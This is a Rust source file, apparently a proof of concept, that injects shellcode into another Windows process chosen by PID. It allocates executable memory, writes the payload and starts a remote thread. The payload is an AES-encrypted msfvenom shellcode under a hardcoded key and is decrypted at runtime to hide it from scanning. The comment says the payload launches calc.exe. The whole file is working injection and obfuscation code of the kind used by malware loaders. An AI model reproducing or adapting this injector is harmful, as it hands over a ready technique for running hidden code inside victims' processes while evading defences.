use std::ffi::c_void;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, CreateRemoteThread, LPTHREAD_START_ROUTINE};
use windows::Win32::Foundation::{HANDLE, CloseHandle};
use windows::core::Error;

use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};

// THIS IS NOT SECURE. This is just for simple PoC.
const NONCE: &[u8; 12] = b"unique nonce";

struct Process {
    pid: u32,
    handle: HANDLE,
}

impl Process {
    fn open_handle(pid: u32) -> Result<Self, Error> {
        let desired_access: PROCESS_ACCESS_RIGHTS = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
        unsafe {
            OpenProcess(desired_access, false, pid)
            .map(|handle| Self { pid, handle })
        }
    }

    fn inject(&self, mut shellcode: Vec<u8>) {

        let shellcode_size = shellcode.len();
        let sc = (shellcode.as_mut_ptr()) as *mut c_void;

        unsafe { 
            let mem_addr = VirtualAllocEx(
                self.handle,
                None,
                shellcode_size,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            );

            WriteProcessMemory(
                self.handle,
                mem_addr,
                sc,
                shellcode_size,
                None
            );

            let x = std::mem::transmute::<*mut c_void, LPTHREAD_START_ROUTINE>(mem_addr); // this is ugly, should be a better way..
            let _h_remote_thread = CreateRemoteThread(
                self.handle,
                None,
                0,
                x,
                None,
                0,
                None
            );

            CloseHandle(self.handle);
        };

    }
}

fn get_padded_key(key: String) -> [u8; 32] {
    let key_as_bytes = key.as_bytes();
    let mut padded_key: [u8; 32] = [0x00; 32];
    for i in 0..32.min(key.len()) {
        padded_key[i] = key_as_bytes[i];
    }
    padded_key
}

fn encrypt_plaintext(plaintext: &Vec<u8>, key: String) -> Result<Vec<u8>, aes_gcm::Error> {
    let padded_key = get_padded_key(key);
    let cipher = Aes256Gcm::new_from_slice(&padded_key).unwrap();
    let nonce = Nonce::from_slice(NONCE);

    let ciphertext = cipher.encrypt(nonce, plaintext.as_ref())?;
    Ok(ciphertext)
}

fn decrypt_ciphertext(ciphertext: &Vec<u8>, key: String) -> Result<Vec<u8>, aes_gcm::Error> {
    let padded_key = get_padded_key(key);
    let cipher = Aes256Gcm::new_from_slice(&padded_key).unwrap();
    let nonce = Nonce::from_slice(NONCE);

    let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())?;
    Ok(plaintext)
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        println!("Usage: {} <pid>", args[0]);
        std::process::exit(-1);
    }
    let process_id: u32 = match args[1].trim().parse() {
        Ok(pid) => pid,
        Err(_) => {
            println!("Process id must be numeric");
            std::process::exit(-1);
        },
    };

    // msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b \x00 -f rust
    //let shellcode = Vec::<u8>::from([0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0xd7, 0x35, 0x4d, 0xe7, 0x00, 0x6f, 0xa6, 0xc3, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x2b, 0x7d, 0xce, 0x03, 0xf0, 0x87, 0x66, 0xc3, 0xd7, 0x35, 0x0c, 0xb6, 0x41, 0x3f, 0xf4, 0x92, 0x81, 0x7d, 0x7c, 0x35, 0x65, 0x27, 0x2d, 0x91, 0xb7, 0x7d, 0xc6, 0xb5, 0x18, 0x27, 0x2d, 0x91, 0xf7, 0x7d, 0xc6, 0x95, 0x50, 0x27, 0xa9, 0x74, 0x9d, 0x7f, 0x00, 0xd6, 0xc9, 0x27, 0x97, 0x03, 0x7b, 0x09, 0x2c, 0x9b, 0x02, 0x43, 0x86, 0x82, 0x16, 0xfc, 0x40, 0xa6, 0x01, 0xae, 0x44, 0x2e, 0x85, 0x74, 0x1c, 0xaf, 0x8b, 0x3d, 0x86, 0x48, 0x95, 0x09, 0x05, 0xe6, 0xd0, 0xe4, 0x26, 0x4b, 0xd7, 0x35, 0x4d, 0xaf, 0x85, 0xaf, 0xd2, 0xa4, 0x9f, 0x34, 0x9d, 0xb7, 0x8b, 0x27, 0xbe, 0x87, 0x5c, 0x75, 0x6d, 0xae, 0x01, 0xbf, 0x45, 0x95, 0x9f, 0xca, 0x84, 0xa6, 0x8b, 0x5b, 0x2e, 0x8b, 0xd6, 0xe3, 0x00, 0xd6, 0xc9, 0x27, 0x97, 0x03, 0x7b, 0x74, 0x8c, 0x2e, 0x0d, 0x2e, 0xa7, 0x02, 0xef, 0xd5, 0x38, 0x16, 0x4c, 0x6c, 0xea, 0xe7, 0xdf, 0x70, 0x74, 0x36, 0x75, 0xb7, 0xfe, 0x87, 0x5c, 0x75, 0x69, 0xae, 0x01, 0xbf, 0xc0, 0x82, 0x5c, 0x39, 0x05, 0xa3, 0x8b, 0x2f, 0xba, 0x8a, 0xd6, 0xe5, 0x0c, 0x6c, 0x04, 0xe7, 0xee, 0xc2, 0x07, 0x74, 0x15, 0xa6, 0x58, 0x31, 0xff, 0x99, 0x96, 0x6d, 0x0c, 0xbe, 0x41, 0x35, 0xee, 0x40, 0x3b, 0x15, 0x0c, 0xb5, 0xff, 0x8f, 0xfe, 0x82, 0x8e, 0x6f, 0x05, 0x6c, 0x12, 0x86, 0xf1, 0x3c, 0x28, 0xca, 0x10, 0xaf, 0xba, 0x6e, 0xa6, 0xc3, 0xd7, 0x35, 0x4d, 0xe7, 0x00, 0x27, 0x2b, 0x4e, 0xd6, 0x34, 0x4d, 0xe7, 0x41, 0xd5, 0x97, 0x48, 0xb8, 0xb2, 0xb2, 0x32, 0xbb, 0x8f, 0xbb, 0xe9, 0xdd, 0x74, 0xf7, 0x41, 0x95, 0xd2, 0x3b, 0x3c, 0x02, 0x7d, 0xce, 0x23, 0x28, 0x53, 0xa0, 0xbf, 0xdd, 0xb5, 0xb6, 0x07, 0x75, 0x6a, 0x1d, 0x84, 0xc4, 0x47, 0x22, 0x8d, 0x00, 0x36, 0xe7, 0x4a, 0x0d, 0xca, 0x98, 0x84, 0x61, 0x03, 0xc5, 0xed, 0xb2, 0x4d, 0x28, 0xe7, 0x00, 0x6f, 0xa6, 0xc3]);
    let encrypted_shellcode = Vec::<u8>::from([0x7e, 0xfc, 0xeb, 0x34, 0x85, 0x33, 0xa7, 0xc8, 0x48, 0xaf, 0x64, 0x26, 0x6d, 0xe2, 0x55, 0xa1, 0xb1, 0x25, 0x9e, 0x82, 0x1f, 0x63, 0x97, 0xd7, 0x40, 0x3b, 0x40, 0x20, 0xc, 0x2a, 0xcb, 0x9a, 0x23, 0x7d, 0xa, 0xc1, 0x4b, 0x49, 0x64, 0x93, 0xe0, 0xd9, 0x18, 0x22, 0x3f, 0xc7, 0x65, 0x87, 0x2c, 0xaa, 0x1a, 0x9e, 0xf0, 0x7e, 0xf6, 0x50, 0xf4, 0x11, 0x21, 0xde, 0xff, 0xa8, 0xaf, 0xce, 0x50, 0x19, 0x24, 0xe0, 0x80, 0x7e, 0x74, 0xd8, 0x41, 0x90, 0x29, 0xbd, 0x6e, 0x5a, 0x28, 0xfd, 0x81, 0x51, 0x4b, 0x34, 0xfb, 0x68, 0xf0, 0x82, 0x88, 0x5c, 0xd7, 0x69, 0x25, 0xbe, 0x21, 0xed, 0x6e, 0x56, 0x6b, 0xf9, 0xaa, 0x5d, 0xa7, 0xc4, 0xfc, 0xf3, 0x9f, 0xb, 0x30, 0xc6, 0x41, 0x21, 0x6e, 0x3d, 0x21, 0x46, 0x27, 0xbf, 0xad, 0x1d, 0x4e, 0x92, 0x39, 0xb1, 0x6c, 0x34, 0x2d, 0x6, 0x1b, 0x99, 0x74, 0x91, 0x96, 0x8d, 0x37, 0xbc, 0x5, 0xd5, 0xa0, 0xba, 0xe1, 0x3e, 0x94, 0x22, 0x2f, 0x83, 0x3f, 0x96, 0xcf, 0x82, 0x39, 0xe6, 0xde, 0x6f, 0xf4, 0xda, 0x79, 0xfd, 0x83, 0x7, 0x15, 0x9b, 0xab, 0xe, 0xad, 0x75, 0x45, 0xf0, 0x82, 0xde, 0x1f, 0xc4, 0x8d, 0x5e, 0x88, 0xb2, 0x8d, 0x4, 0x1e, 0x21, 0xa9, 0x33, 0x4a, 0x19, 0xf6, 0xda, 0x2d, 0x32, 0xc7, 0x61, 0xe0, 0x9e, 0x8, 0x40, 0x9d, 0x40, 0x6b, 0xd3, 0x16, 0x2a, 0x8, 0x1a, 0x8e, 0x5d, 0xf2, 0xdf, 0xa0, 0xac, 0x82, 0xac, 0xb0, 0xe, 0x3f, 0x16, 0x83, 0x6a, 0x67, 0xae, 0x9f, 0x7a, 0x7a, 0x4c, 0x8, 0xa3, 0x21, 0x3b, 0x8d, 0xd8, 0xdc, 0x63, 0xbf, 0x18, 0xd4, 0xd6, 0x7a, 0x9d, 0xf2, 0x16, 0x94, 0x72, 0x9e, 0xec, 0x2e, 0xff, 0xd6, 0xfc, 0x96, 0xc9, 0x5e, 0xae, 0xd5, 0x2c, 0xce, 0x3f, 0x7d, 0xf, 0xa, 0xba, 0xc3, 0xda, 0x19, 0x67, 0xd0, 0x87, 0x5c, 0xd2, 0xf6, 0xd4, 0xb, 0xe1, 0xf3, 0x23, 0xda, 0xa3, 0x69, 0xb4, 0x3b, 0x84, 0xf1, 0xde, 0x5e, 0x7d, 0x4a, 0x3d, 0xfe, 0x6a, 0x22, 0x3c, 0xef, 0xf5, 0x22, 0x3e, 0x1b, 0xf, 0xe6, 0x7d, 0xe4, 0x19, 0xe, 0x15, 0x74, 0xbb, 0x9e, 0x22, 0xe9, 0x19, 0x2b, 0x69, 0x30, 0x29, 0x54, 0x44, 0xcf, 0x60, 0x69, 0xa6, 0x23, 0x95, 0xc5, 0x80, 0xc2, 0x9d, 0x16, 0xa8, 0xcd, 0x26, 0x1b, 0xbf, 0x3e, 0xda, 0x60, 0x16, 0x20, 0xc0, 0x13]);

    let decrypted_shellcode = decrypt_ciphertext(&encrypted_shellcode, String::from("testkey")).unwrap();
    let target_process = Process::open_handle(process_id).expect("Could not get handle to target process!");
    target_process.inject(decrypted_shellcode);
}